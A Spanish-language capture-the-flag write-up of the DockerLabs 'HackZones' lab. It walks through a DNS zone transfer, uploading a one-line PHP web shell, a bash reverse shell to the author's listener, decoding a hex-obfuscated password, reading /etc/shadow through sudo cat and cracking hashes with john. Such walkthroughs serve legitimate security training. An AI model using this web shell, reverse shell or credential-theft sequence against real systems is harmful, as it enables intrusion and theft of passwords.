---
title: DockerLabs - HackZones
summary: "Write-up del laboratorio HackZones de DockerLabs"
author: elcybercurioso
date: 2026-01-04
categories: [Post, DockerLabs]
tags: [medio, zone transfer, dns, arbitrary file upload, rce, sudo, privesc, credentials leaking]
media_subpath: "/assets/img/posts/dockerlabs_hackzones"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ nmap -sCV -p22,53,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8e:a2:56:38:e1:85:2f:21:2b:55:ec:29:5b:f8:63:d9 (ECDSA)
|_  256 0f:4b:38:fa:04:33:c7:01:5a:98:12:05:2d:42:cf:1a (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-0ubuntu0.24.04.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: HackZones.hl - Seguridad para tu Empresa
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Comenzamos revisando la página principal del servidor web:

![Desktop View](/20251118132357.webp){: width="972" height="589" .shadow}

Encontramos lo que posiblemente se trate del virtual host que está empleando la página:

![Desktop View](/20251118143517.webp){: width="972" height="589" .shadow}

Por ello, agregamos en el fichero `/etc/hosts` de nuestra máquina una nueva línea con la IP del laboratorio, y las posibles variantes del virtual host:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ cat /etc/hosts                                                   
...
172.17.0.2      hackzones.hl hackzone.hl
...
```

Vemos que para el dominio `hackzones.hl` no conseguimos hacer un ataque de transferencia de zona:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ dig axfr hackzones.hl @172.17.0.2

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr hackzones.hl @172.17.0.2
;; global options: +cmd
; Transfer failed.
```

Sin embargo, para el dominio `hackzone.hl` parece que se realiza correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ dig axfr @172.17.0.2 hackzone.hl

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @172.17.0.2 hackzone.hl
; (1 server found)
;; global options: +cmd
hackzone.hl.            604800  IN      SOA     ns.hackzone.hl. root.hackzone.hl. 2 604800 86400 2419200 604800
hackzone.hl.            604800  IN      NS      ns.hackzone.hl.
flag.hackzone.hl.       604800  IN      TXT     "FLAG{********-*****-*****-******}"
ns.hackzone.hl.         604800  IN      A       127.0.0.1
User.hackzone.hl.       604800  IN      TXT     "mrRobot@hackzone.hl"
www.hackzone.hl.        604800  IN      A       127.0.0.1
hackzone.hl.            604800  IN      SOA     ns.hackzone.hl. root.hackzone.hl. 2 604800 86400 2419200 604800
;; Query time: 4 msec
;; SERVER: 172.17.0.2#53(172.17.0.2) (TCP)
;; XFR size: 7 records (messages 1, bytes 286)
```

Tratamos de acceder al dominio `hackzones.hl`, y vemos que se nos muestra un panel de autenticación:

![Desktop View](/20251118133920.webp){: width="972" height="589" .shadow}

Dejamos corriendo en segundo plano un escaneo de recursos del servidor web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ gobuster dir -u "http://hackzones.hl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hackzones.hl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 860]
/uploads              (Status: 301) [Size: 314] [--> http://hackzones.hl/uploads/]
/upload.php           (Status: 200) [Size: 1377]
/dashboard.html       (Status: 200) [Size: 5671]
/authenticate.php     (Status: 302) [Size: 0] [--> index.html?error=1]
/server-status        (Status: 403) [Size: 277]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Uno de los recursos que encontramos es `dashboard.html`, el cual parece que se trata de un recurso privado, pero al cual podemos acceder:

![Desktop View](/20251118134412.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Tras revisar la página `dashboard.html`, nos damos cuenta de que podemos llegar a cambiar la foto de perfil:

![Desktop View](/20251118134509.webp){: width="972" height="589" .shadow}

Para ver si es vulnerable a un **Insecure File Upload** (permitir subir ficheros que no debería poderse hacer, como por ejemplo, scripts en PHP), probamos a subir un script en PHP, el cual nos permitiría ejecutar comandos de forma remota en caso de que lo logremos subir:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ cat cmd.php                                             
<?php
        system($_GET['cmd']);
?>
```

Al tratar de subir el script anterior, vemos que no nos indica ningún error, por lo que damos por hecho que no se está realizando ninguna verificación antes de subir una "foto de perfil":

![Desktop View](/20251118134727.webp){: width="972" height="589" .shadow}

Accedemos al recurso `/uploads` que encontramos anteriormente, y vemos que nuestro fichero se encuentra aquí:

![Desktop View](/20251118134803.webp){: width="972" height="589" .shadow}

Lo abrimos, e indicamos el parámetro `cmd` y un comando:

![Desktop View](/20251118134826.webp){: width="972" height="589" .shadow}

Viendo que tenemos la posibilidad de ejecutar comandos de forma remota, procedemos a entablarnos una **reverse shell**, poniéndonos antes en escucha con `nc`, que en mi caso será por el puerto 4444, y ejecutamos el siguiente comando:

```bash
http://hackzones.hl/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/<nuestra IP>/<puerto en escucha> 0>%261"
```

Deberíamos haber obtenido una consola de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59770
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ whoami
whoami
www-data
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ hostname -I
hostname -I
172.17.0.2
```

## movimiento lateral (mrrobot)

Tratamos la TTY para poder operar con mayor facilidad:

```bash
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ script -c bash /dev/null
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ stty raw -echo;fg       
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ export TERM=xterm
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ export SHELL=bash
www-data@7d478a1b0a1f:/var/www/hackzones.hl/uploads$ stty rows 49 columns 210
```

Revisamos los posibles usuarios que tienen asignada una consola en el fichero `/etc/passwd` en la máquina víctima:

```bash
www-data@7d478a1b0a1f:/home$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mrrobot:x:1000:1000::/home/mrRobot:/bin/bash
```

En la carpeta `/var/www/html` encontramos una carpeta que contiene un script cuyo contenido podemos ver:

```bash
www-data@7d478a1b0a1f:/var/www/html$ ls -la
total 24
drwxr-xr-x 1 root root 4096 Nov 14  2024 .
drwxr-xr-x 1 root root 4096 Nov 12  2024 ..
-rw-r--r-- 1 root root 7202 Nov 14  2024 index.html
drwxr-xr-x 1 root root 4096 Nov 15  2024 supermegaultrasecretfolder
www-data@7d478a1b0a1f:/var/www/html$ ls -la supermegaultrasecretfolder/
total 12
drwxr-xr-x 1 root root 4096 Nov 15  2024 .
drwxr-xr-x 1 root root 4096 Nov 14  2024 ..
-rw-r--r-- 1 root root  336 Nov 15  2024 secret.sh
www-data@7d478a1b0a1f:/var/www/html$ cd supermegaultrasecretfolder/
www-data@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ cat secret.sh 
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
  echo "Este script debe ser ejecutado como root."
  exit 1
fi

p1=$(echo -e "\x**\x**\x**\x**\x**\x**\x**\x**") 
p2="\x**"                                       
p3="\x**\x**"                                   
p4="\x**\x**\x**\x**"                           

echo -e "${p1}${p2}${p3}${p4}"
```

Analizando el contenido, nos damos cuenta de que está realizando la concatenación de cadenas codificadas en hexadecimal, por lo que procedemos a decodificar cada línea individualmente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ echo -e "\x**\x**\x**\x**\x**\x**\x**\x**"
P*******
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ echo -e "\x**\x**\x**\x**\x**\x**\x**"    
@******
```

El resultado lo juntamos, y tratamos de ver si se trata de la contraseña del usuario `mrrobot`, y vemos que así es:

```bash
www-data@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ su mrrobot
Password: 
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ whoami
mrrobot
```

En la carpeta personal del usuario `mrrobot` encontramos la primera flag:

```bash
mrrobot@7d478a1b0a1f:~$ cat user.txt 
c187****************************
```

## escalada de privilegios (root)

En los permisos SUDO del usuario `mrrobot`, encontramos que puede ejecutar el binario `/usr/bin/cat` como el usuario `root`:

```bash
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ sudo -l
Matching Defaults entries for mrrobot on 7d478a1b0a1f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mrrobot may run the following commands on 7d478a1b0a1f:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```

 Nos indican en [GTFOBins](https://gtfobins.github.io/gtfobins/cat/#sudo) que cuando un usuario tenga permisos SUDO de otro usuario sobre este binario, se pueden leer ficheros como el otro usuario de la siguiente manera:

![Desktop View](/20251118135921.webp){: width="972" height="589" .shadow}

Siendo este el caso, procedemos a leer el fichero `/etc/shadow`, ya que podemos llegar a obtener las credenciales de todos los usuarios del sistema por fuerza bruta:

```bash
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ sudo cat /etc/shadow
root:****************************.********************************************:20041:0:99999:7:::
...
mrrobot:****************************.********************************************:20042:0:99999:7:::
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ sudo cat /root/.ssh/id_rsa
cat: /root/.ssh/id_rsa: No such file or directory
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
mrrobot:x:1000:1000::/home/mrRobot:/bin/bash
```

Guardamos el contenido de los ficheros `/etc/passwd` y `/etc/shadow` en nuestro sistema, y empleando **unshadow**, generamos un fichero que herramientas como **john** o **hashcat** puedan interpretar:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ unshadow passwd shadow > hash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hackzones]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash
```

Dejamos en segundo plano la consola donde se está ejecutando **john**, y seguimos investigando la máquina víctima.

Tratamos de ver el contenido de la segunda flag, pero vemos que el autor de la máquina ya ha pensado en esta posibilidad:

```bash
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ sudo cat /root/root.txt
Don't think it's that easy, keep looking
```

Investigando los ficheros del sistema, encontramos uno cuyo contenido indica logs pertenecientes a actualizaciones pasadas:

```bash
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ sudo cat /opt/SistemUpdate
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  libc-bin libc-dev-bin libc6 libc6-dev libc6-i386
5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 8,238 kB of archives.
After this operation, 1,024 B of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6 amd64 2.31-0ubuntu9.9 [2,737 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-bin amd64 2.31-0ubuntu9.9 [635 kB]
Get:3 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6-dev amd64 2.31-0ubuntu9.9 [2,622 kB]
Get:4 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-dev-bin amd64 2.31-0ubuntu9.9 [189 kB]
Fetched 8,238 kB in 2s (4,119 kB/s)
Extracting user root:r******** from packages: 50% 
Extracting templates from packages: 100%
Preconfiguring packages ...
(Reading database ... 275198 files and directories currently installed.)
Preparing to unpack .../libc6_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc6-dev_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6-dev:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-dev-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-dev-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Setting up libc6:amd64 (2.31-0ubuntu9.9) ...
Setting up libc-bin (2.31-0ubuntu9.9) ...
Setting up libc-dev-bin (2.31-0ubuntu9.9) ...
Setting up libc6-dev:amd64 (2.31-0ubuntu9.9) ...
Processing triggers for libc-bin (2.31-0ubuntu9.9) ...
```

Sin embargo, en una de las líneas, vemos lo que parecerían ser las credenciales del usuario `root`, por lo que vamos a probar si este es el caso:

```bash
mrrobot@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder$ su root
Password: 
root@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder# whoami
root
```

Vemos que en efecto se tratan de las credenciales del usuario `root`, por lo que ahora nos podemos dirigir al directorio `/root`, y visualizar la segunda flag:

```bash
root@7d478a1b0a1f:/var/www/html/supermegaultrasecretfolder# cd /root
root@7d478a1b0a1f:~# ls
TrueRoot.txt  root.txt
root@7d478a1b0a1f:~# cat TrueRoot.txt 
f034****************************
```



<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>